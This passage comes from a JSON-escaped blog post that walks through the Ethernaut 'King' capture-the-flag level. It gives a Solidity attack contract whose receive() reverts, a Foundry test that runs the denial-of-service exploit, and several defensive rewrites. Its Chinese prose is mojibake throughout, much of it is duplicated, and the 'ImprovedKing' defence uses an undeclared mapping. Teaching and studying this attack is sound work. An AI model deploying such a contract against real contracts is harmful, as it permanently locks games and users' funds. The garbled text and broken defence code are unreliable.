king</li>\n<li><strong>éƒ¨ç½²æ”»å‡»åˆçº¦</strong>ï¼šåˆçº¦çš„ <code>receive()</code> å‡½æ•°ä¼š revert</li>\n<li><strong>æˆä¸º king</strong>ï¼šå‘é€è¶³å¤Ÿçš„ ETH</li>\n<li><strong>é”å®šç‹ä½</strong>ï¼šä»»ä½•åç»­å°è¯•éƒ½ä¼šå› ä¸º transfer å¤±è´¥è€Œå›æ»š</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// éƒ¨ç½²æ”»å‡»åˆçº¦</span><br><span class=\"line\">KingAttacker attacker = new KingAttacker&#123;value: initialPrize + 1&#125;(levelInstance);</span><br><span class=\"line\"></span><br><span class=\"line\">// å‘é€ ETH æˆä¸º king</span><br><span class=\"line\">attacker.attack&#123;value: initialPrize + 1&#125;();</span><br><span class=\"line\"></span><br><span class=\"line\">// éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">assertEq(instance._king(), address(attacker));</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-ä½¿ç”¨-Pull-Payment-æ¨¡å¼\"><a href=\"#1-ä½¿ç”¨-Pull-Payment-æ¨¡å¼\" class=\"headerlink\" title=\"1. ä½¿ç”¨ Pull Payment æ¨¡å¼\"></a>1. ä½¿ç”¨ Pull Payment æ¨¡å¼</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ ä¸å®‰å…¨ï¼šPush Payment</span><br><span class=\"line\">contract VulnerableKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt;= prize);</span><br><span class=\"line\">        payable(king).transfer(msg.value);  // å¯èƒ½å¤±è´¥</span><br><span class=\"line\">        king = msg.sender;</span><br><span class=\"line\">        prize = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… å®‰å…¨ï¼šPull Payment</span><br><span class=\"line\">contract SecureKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    mapping(address =&gt; uint) public pendingWithdrawals;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt;= prize);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // è®°å½•å¾…æå–é‡‘é¢</span><br><span class=\"line\">        if (king != address(0)) &#123;</span><br><span class=\"line\">            pendingWithdrawals[king] += prize;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        king = msg.sender;</span><br><span class=\"line\">        prize = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // è®©ç”¨æˆ·è‡ªå·±æå–èµ„é‡‘</span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        uint amount = pendingWithdrawals[msg.sender];</span><br><span class=\"line\">        require(amount &gt; 0, &quot;No funds to withdraw&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        pendingWithdrawals[msg.sender] = 0;</span><br><span class=\"line\">        payable(msg.sender).transfer(amount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨-call-å¹¶å¤„ç†å¤±è´¥\"><a href=\"#2-ä½¿ç”¨-call-å¹¶å¤„ç†å¤±è´¥\" class=\"headerlink\" title=\"2. ä½¿ç”¨ call å¹¶å¤„ç†å¤±è´¥\"></a>2. ä½¿ç”¨ call å¹¶å¤„ç†å¤±è´¥</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract ImprovedKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt;= prize);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ä½¿ç”¨ call å¹¶å¤„ç†å¤±è´¥</span><br><span class=\"line\">        if (king != address(0)) &#123;</span><br><span class=\"line\">            (bool success, ) = payable(king).call&#123;value: prize&#125;(&quot;&quot;);</span><br><span class=\"line\">            if (!success) &#123;</span><br><span class=\"line\">                // è®°å½•å¤±è´¥çš„æ”¯ä»˜ï¼Œè®©ç”¨æˆ·æ‰‹åŠ¨æå–</span><br><span class=\"line\">                pendingWithdrawals[king] += prize;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        king = msg.sender;</span><br><span class=\"line\">        prize = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-å®ç°ç´§æ€¥åœæ­¢æœºåˆ¶\"><a href=\"#3-å®ç°ç´§æ€¥åœæ­¢æœºåˆ¶\" class=\"headerlink\" title=\"3. å®ç°ç´§æ€¥åœæ­¢æœºåˆ¶\"></a>3. å®ç°ç´§æ€¥åœæ­¢æœºåˆ¶</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SafeKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    bool public paused;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner() &#123;</span><br><span class=\"line\">        require(msg.sender == owner);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier whenNotPaused() &#123;</span><br><span class=\"line\">        require(!paused);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function pause() public onlyOwner &#123;</span><br><span class=\"line\">        paused = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unpause() public onlyOwner &#123;</span><br><span class=\"line\">        paused = false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable whenNotPaused &#123;</span><br><span class=\"line\">        // æ­£å¸¸é€»è¾‘</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><h3 id=\"DoS-æ”»å‡»æ£€æµ‹\"><a href=\"#DoS-æ”»å‡»æ£€æµ‹\" class=\"headerlink\" title=\"DoS æ”»å‡»æ£€æµ‹\"></a>DoS æ”»å‡»æ£€æµ‹</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// æ£€æµ‹åˆçº¦æ˜¯å¦èƒ½æ¥æ”¶ ETH</span><br><span class=\"line\">function canReceiveEther(address target) public returns (bool) &#123;</span><br><span class=\"line\">    (bool success, ) = target.call&#123;value: 1 wei&#125;(&quot;&quot;);</span><br><span class=\"line\">    return success;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Gas-é™åˆ¶åˆ†æ\"><a href=\"#Gas-é™åˆ¶åˆ†æ\" class=\"headerlink\" title=\"Gas é™åˆ¶åˆ†æ\"></a>Gas é™åˆ¶åˆ†æ</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ forge åˆ†æ Gas ä½¿ç”¨</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --gas-report</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ£€æŸ¥ transfer vs call Gas æ¶ˆè€—</span></span><br><span class=\"line\">cast estimate --value 1000000000000000000 &lt;CONTRACT_ADDRESS&gt; <span class=\"string\">&quot;receive()&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li><code>send</code> å’Œ <code>transfer</code> ç°åœ¨å·²è¢«å¼ƒç”¨ï¼Œå³ä½¿æ˜¯ <code>call</code>ï¼Œä½¿ç”¨æ—¶æœ€å¥½æŒ‰ç…§æ£€æŸ¥-æ•ˆæœ-äº¤äº’æ¨¡å¼è°ƒç”¨</li>\n<li>å¤–éƒ¨è°ƒç”¨å¿…é¡»è°¨æ…ä½¿ç”¨ï¼Œå¿…é¡»æ­£ç¡®å¤„ç†é”™è¯¯</li>\n<li>Push Payment æ¨¡å¼å®¹æ˜“å—åˆ° DoS æ”»å‡»</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>é€šè¿‡æ‹’ç»æ¥æ”¶ ETH æ¥ç ´åæ”¯ä»˜æµç¨‹</li>\n<li>åˆ©ç”¨ <code>transfer</code> å¤±è´¥æ—¶çš„å›æ»šç‰¹æ€§</li>\n<li>æˆä¸ºæ°¸ä¹…çš„ kingï¼Œç ´åæ¸¸æˆæœºåˆ¶</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>ä½¿ç”¨ Pull Payment æ¨¡å¼</li>\n<li>æ­£ç¡®å¤„ç†å¤–éƒ¨è°ƒç”¨å¤±è´¥</li>\n<li>å®ç°ç´§æ€¥åœæ­¢å’Œæ¢å¤æœºåˆ¶</li>\n<li>é¿å…ä¾èµ–å¤–éƒ¨è°ƒç”¨çš„æˆåŠŸ</li>\n</ul>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-08-vault/\">ä¸Šä¸€å…³: Level 8 - Vault</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-10-reentrancy/\">ä¸‹ä¸€å…³: Level 10 - Re-entrancy</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-9-King-æ‹’ç»æœåŠ¡æ”»å‡»\"><a href=\"#ğŸ¯-Ethernaut-Level-9-King-æ‹’ç»æœåŠ¡æ”»å‡»\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 9: King - æ‹’ç»æœåŠ¡æ”»å‡»\"></a>ğŸ¯ Ethernaut Level 9: King - æ‹’ç»æœåŠ¡æ”»å‡»</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/9\">Ethernaut Level 9 - King</a><br><strong>æ”»å‡»ç±»å‹</strong>: æ‹’ç»æœåŠ¡æ”»å‡» (DoS)<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è°å‡ºèµ„æ›´é«˜çš„æ—¶å€™ï¼Œè°å°±æˆä¸º kingï¼Œç›®æ ‡æ˜¯è®©è‡ªå·±æˆä¸º king ä¹‹åï¼Œåˆ«äººæ— æ³•å¤ºå–ç‹ä½ã€‚æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å¿…é¡»æˆä¸ºç‹è€…å¹¶ä¸€ç›´ä¿æŒå›½ç‹ï¼Œç„¶åæ‰“ç ´æ¸¸æˆã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel9.svg\" alt=\"King Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"transfer-å‡½æ•°çš„ç‰¹æ€§\"><a href=\"#transfer-å‡½æ•°çš„ç‰¹æ€§\" class=\"headerlink\" title=\"transfer() å‡½æ•°çš„ç‰¹æ€§\"></a>transfer() å‡½æ•°çš„ç‰¹æ€§</h3><p>æˆ‘ä»¬éœ€è¦ç†è§£ <code>transfer</code>ï¼ˆç°åœ¨åŸºæœ¬è¢«å¼ƒç”¨ï¼‰æ˜¯å¦‚ä½•åœ¨ Solidity ä¸­å·¥ä½œçš„ï¼š</p>\n<ul>\n<li>å¦‚æœ <code>transfer</code> å¤±è´¥ï¼Œæ­¤å‡½æ•°æŠ›å‡ºé”™è¯¯ï¼Œä½†ä¸è¿”å›å¸ƒå°”å€¼</li>\n<li>è¿™æ„å‘³ç€å¦‚æœ <code>transfer</code> å¤±è´¥ï¼Œäº¤æ˜“å°†æ¢å¤</li>\n<li>Gas é™åˆ¶ä¸º 2300ï¼Œä¸è¶³ä»¥æ‰§è¡Œå¤æ‚é€»è¾‘</li>\n</ul>\n<h3 id=\"å…³é”®æ¼æ´ä»£ç \"><a href=\"#å…³é”®æ¼æ´ä»£ç \" class=\"headerlink\" title=\"å…³é”®æ¼æ´ä»£ç \"></a>å…³é”®æ¼æ´ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">receive() external payable &#123;</span><br><span class=\"line\">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class=\"line\">    payable(king).transfer(msg.value);  // æ˜“å—æ”»å‡»çš„ç‚¹</span><br><span class=\"line\">    king = msg.sender;</span><br><span class=\"line\">    prize = msg.value;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ”»å‡»å‘é‡\"><a href=\"#æ”»å‡»å‘é‡\" class=\"headerlink\" title=\"æ”»å‡»å‘é‡\"></a>æ”»å‡»å‘é‡</h3><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>transfer()</code> å‡½æ•°å¤±è´¥æ—¶ä¼šå›æ»šçš„ç‰¹æ€§ï¼š</p>\n<ol>\n<li>éƒ¨ç½²ä¸€ä¸ªåˆçº¦æˆä¸º king</li>\n<li>åˆçº¦ä¸å®šä¹‰ <code>receive()</code> æˆ– <code>fallback()</code> å‡½æ•°</li>\n<li>æˆ–è€…åœ¨ <code>receive()</code> å‡½æ•°ä¸­ç›´æ¥ revert</li>\n<li>è¿™æ ·åˆçº¦å°†æ— æ³•æ¥æ”¶ ETHï¼Œé˜»æ­¢ä»»ä½•äººæˆä¸ºæ–°çš„ king</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/KingFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract KingAttacker &#123;</span><br><span class=\"line\">    King instance;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address payable _king) payable &#123;</span><br><span class=\"line\">        instance = King(_king);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack() public payable &#123;</span><br><span class=\"line\">        (bool success, ) = address(instance).call&#123;value: msg.value&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Attack failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // å…³é”®ï¼šæ‹’ç»æ¥æ”¶ ETH</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        revert(&quot;I will always be the king!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract KingTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    KingFactory kingFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        kingFactory = new KingFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(kingFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testKingExploit() public &#123;</span><br><span class=\"line\">        // åˆ›å»ºå…³å¡å®ä¾‹</span><br><span class=\"line\">        address payable levelInstance = payable(ethernaut.createLevelInstance&#123;value: 1 ether&#125;(kingFactory));</span><br><span class=\"line\">        King instance = King(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ£€æŸ¥åˆå§‹çŠ¶æ€</span><br><span class=\"line\">        uint256 initialPrize = instance.prize();</span><br><span class=\"line\">        address initialKing = instance._king();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½²æ”»å‡»åˆçº¦</span><br><span class=\"line\">        KingAttacker attacker = new KingAttacker&#123;value: initialPrize + 1&#125;(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ‰§è¡Œæ”»å‡»ï¼šæˆä¸º king</span><br><span class=\"line\">        attacker.attack&#123;value: initialPrize + 1&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(instance._king(), address(attacker));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // å°è¯•æœ‰äººè¶…è¶Šæˆ‘ä»¬ï¼ˆåº”è¯¥å¤±è´¥ï¼‰</span><br><span class=\"line\">        vm.expectRevert();</span><br><span class=\"line\">        (bool success, ) = levelInstance.call&#123;value: initialPrize + 2&#125;(&quot;&quot;);</span><br><span class=\"line\">        assertFalse(success);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æˆ‘ä»¬ä»ç„¶æ˜¯ king</span><br><span class=\"line\">        assertEq(instance._king(), address(attacker));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // è¿™ä¸ªå…³å¡æ— æ³•æ­£å¸¸æäº¤ï¼Œå› ä¸ºæˆ‘ä»¬ç ´åäº†æ¸¸æˆæœºåˆ¶</span><br><span class=\"line\">        // ä½†è¿™æ­£æ˜¯å…³å¡æƒ³è¦æ¼”ç¤ºçš„æ”»å‡»æ•ˆæœ</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>åˆ†æå½“å‰ prize</strong>ï¼šç¡®å®šéœ€è¦å¤šå°‘ ETH æˆä¸º king</li>\n<li><strong>éƒ¨ç½²æ”»å‡»åˆçº¦</strong>ï¼šåˆçº¦çš„ <code>receive()</code> å‡½æ•°ä¼š revert</li>\n<li><strong>æˆä¸º king</strong>ï¼šå‘é€è¶³å¤Ÿçš„ ETH</li>\n<li><strong>é”å®šç‹ä½</strong>ï¼šä»»ä½•åç»­å°è¯•éƒ½ä¼šå› ä¸º transfer å¤±è´¥è€Œå›æ»š</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// éƒ¨ç½²æ”»å‡»åˆçº¦</span><br><span class=\"line\">KingAttacker attacker = new KingAttacker&#123;value: initialPrize + 1&#125;(levelInstance);</span><br><span class=\"line\"></span><br><span class=\"line\">// å‘é€ ETH æˆä¸º king</span><br><span class=\"line\">attacker.attack&#123;value: initialPrize + 1&#125;();</span><br><span class=\"line\"></span><br><span class=\"line\">// éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">assertEq(instance._king(), address(attacker));</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-ä½¿ç”¨-Pull-Payment-æ¨¡å¼\"><a href=\"#1-ä½¿ç”¨-Pull-Payment-æ¨¡å¼\" class=\"headerlink\" title=\"1. ä½¿ç”¨ Pull Payment æ¨¡å¼\"></a>1. ä½¿ç”¨ Pull Payment æ¨¡å¼</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ ä¸å®‰å…¨ï¼šPush Payment</span><br><span class=\"line\">contract VulnerableKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt;= prize);</span><br><span class=\"line\">        payable(king).transfer(msg.value);  // å¯èƒ½å¤±è´¥</span><br><span class=\"line\">        king = msg.sender;</span><br><span class=\"line\">        prize = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 